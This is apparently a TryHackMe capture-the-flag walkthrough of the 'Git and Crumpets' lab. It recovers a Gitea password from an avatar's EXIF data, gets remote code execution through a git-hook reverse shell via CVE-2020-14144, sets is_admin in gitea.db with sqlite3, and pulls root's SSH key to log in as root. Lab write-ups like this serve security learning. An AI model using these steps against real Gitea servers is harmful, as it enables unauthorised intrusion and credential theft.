# Git and Crumpets [TryHackMe](https://tryhackme.com/room/gitandcrumpets)

---

![](https://i.imgur.com/7X22aYB.png)

---

> Our devs have been clamoring for some centralized version control, so the admin came through. Rumour has it that they included a few countermeasures...

## nmap

```
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.0 (protocol 2.0)
80/tcp open  http    syn-ack ttl 63 nginx
| http-title: Hello, World
|_Requested resource was http://crumpets.thm/index.html
```

---

## HTTP

Redirects you to a RickRoll

Inspecting the source code:

 ```
         Hey guys,
           I set up the dev repos at git.git-and-crumpets.thm, but I haven't gotten around to setting up the DNS yet. 
           In the meantime, here's a fun video I found!
```

```bash
$ echo "${IP} git.git-and-crumpets.thm" >> /etc/hosts
```

![Frontpage](https://i.imgur.com/ryTJyY7.png)

Register a fake user:

![](https://i.imgur.com/kEYTbFe.png)

Explore existing repos:

![](https://i.imgur.com/AeZvJYz.png)

Clone the repos and analyse the history:

`scones/cant-touch-this`
```
...[snip]
commit 9a151a065797e3ae8e4d86da9d32d032cdec6885
Author: scones <withcream@example.com>
Date:   Thu Apr 15 16:29:48 2021 +0200

    Delete Passwords File
    
    I kept the password in my avatar to be more secure.
...[snip]
```

![](https://i.imgur.com/sXK5aTV.png)

```bash
$ wget -q http://git.git-and-crumpets.thm/avatars/3fc2cde6ac97e8c8a0c8b202e527d56d -O scones_avatar
$ file scones_avatar
scones_avatar: PNG image data, 290 x 290, 16-bit/color RGB, non-interlaced
$ exiftool scones_avatar 
...[snip]
File Permissions                : -rw-r--r--
File Type                       : PNG
File Type Extension             : png
MIME Type                       : image/png
Image Width                     : 290
Image Height                    : 290
Bit Depth                       : 16
Color Type                      : RGB
Compression                     : Deflate/Inflate
Filter                          : Adaptive
Interlace                       : Noninterlaced
Description                     : [REDACTED]
Image Size                      : 290x290
Megapixels                      : 0.084
```

We now have user access for `scones`

![](https://i.imgur.com/eEz9MdN.png)

```bash
$ search gitea
Gitea 1.12.5 - Remote Code Execution (Authenticated)                                                | multiple/webapps/49571.py
Gitea 1.4.0 - Remote Code Execution                                                                 | multiple/webapps/44996.py
Gitea 1.7.5 - Remote Code Execution                                                                 | multiple/webapps/49383.py
$ search -m 49571
$ head 49571.py
# Exploit Title: Gitea 1.12.5 - Remote Code Execution (Authenticated)
# Date: 17 Feb 2020
# Exploit Author: Podalirius
# PoC demonstration article: https://podalirius.net/en/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/
# Vendor Homepage: https://gitea.io/
# Software Link: https://dl.gitea.io/
# Version: >= 1.1.0 to <= 1.12.5
```

Following the [Proof of Concept](https://podalirius.net/en/articles/exploiting-cve-2020-14144-gitea-authenticated-remote-code-execution/) after the script failed results in RCE

Add the hook with your reverse shells in the hook script.

![](https://i.imgur.com/wiULY7T.png)

![](https://i.imgur.com/6qmEnm6.png)

```bash
[git@git-and-crumpets data]$ cat ~/user.txt  | base64 -d; echo
thm{************************}
```

Enumerating the `gitea` files we notice another user who owns a private repo.

We also have a database file we can give ourselves maximum privileges with on the webserver.

> Why not go through the files on the server instead of giving yourself admin privs?

GUI is nicer than sorting through files. I initially tried examining roots `backup.git` file but I realised that it was easier to just give myself max privs so `gitea` does the work for me.


```bash
[git@git-and-crumpets data]$ sqlite3 gitea.db
```

```sql
sqlite> .tables
...[snip]               
notice                     user                     
notification               user_open_id             
...[snip]
sqlite> .schema user
CREATE TABLE `user` (`id` INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL, `lower_name` TEXT NOT NULL, `name` TEXT NOT NULL,
...[snip]
is_admin` INTEGER NULL
...[snip]
sqlite> SELECT id, name, is_admin FROM user;
1|hydra|1
2|root|0
3|scones|0
4|test|0
5|bob|0
sqlite> UPDATE user SET is_admin=1 WHERE name="scones";
sqlite> SELECT id, name, is_admin FROM user;
1|hydra|1
2|root|0
3|scones|1
4|test|0
5|bob|0
```

![](https://i.imgur.com/X4nHzti.png)

![](https://i.imgur.com/oab4k2V.png)

![](https://i.imgur.com/6HOHnnO.png)

![](https://i.imgur.com/WpLrscR.png)

```bash
$ curl 'http://git.git-and-crumpets.thm/root/backup/raw/commit/0b23539d97978fc83b763ef8a4b3882d16e71d32/.ssh/Sup3rS3cur3' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Cookie: i_like_gitea=85c281436e647867; lang=en-US; _csrf=yFxoY2sGIv9HcQ42Y_TUSvOLrcs6MTYzNjA1MzcwNjE0NDA1NTA1MA' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' -H 'Cache-Control: max-age=0' > id_rsa.root
$ chmod 600 id_rsa.root
$ ssh -i id_rsa root@git.git-and-crumpets.thm
Load key "id_rsa": invalid format
root@git.git-and-crumpets.thm password: 
$ echo >> id_rsa.root
$ ssh -i id_rsa.root root@git.git-and-crumpets.thm                                                                       
Enter passphrase for key 'id_rsa.root': 
Last login: Thu Nov  4 21:31:24 2021 from 10.9.5.27
[root@git-and-crumpets ~]# cat ~/root.txt | base64 -d; echo
thm{********************}
```

**There is no need to brute force the private key!**


